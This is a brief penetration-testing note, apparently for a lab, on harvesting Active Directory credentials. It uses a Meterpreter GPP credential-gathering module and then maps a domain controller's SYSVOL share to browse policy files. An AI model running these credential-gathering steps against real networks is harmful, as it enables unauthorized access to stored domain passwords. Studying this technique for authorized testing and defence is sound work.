active directory credentials

from meterpreter:

run post/windows/gather/credentials/gpp


from windows shell

Active Directory policies are stored in a special UNC path:

from windows shell

%USERDOMAIN%\Policies

But you cannot access UNC paths via cmd, so you have to use the Sysvol share you can find
on a domain controller:

%LOGONSERVER%\Sysvol

To do that in the lab environment you can type:
> net use X: \\DC01\SysVol
> X:
> cd examplead.lan\Policies
> dir
